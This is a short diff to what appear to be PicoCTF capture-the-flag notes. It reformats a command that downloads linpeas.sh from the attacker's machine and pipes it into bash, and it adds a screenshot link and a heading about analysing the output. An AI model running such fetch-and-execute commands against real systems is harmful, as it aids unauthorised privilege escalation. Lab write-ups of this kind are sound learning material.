@@ -356,5 +356,9 @@ wget ipofmymachine:8000/linpeas.sh
 
 
 ```
-	curl ipofmymachine:8000/linpeas.sh | bash
+curl ipofmymachine:8000/linpeas.sh | bash
 ```
+
+![](../../../../PicoCTF/PicoCTF-assets/Pasted%20image%2020260221124607.png)
+
+#### Analyze the output of linpeas
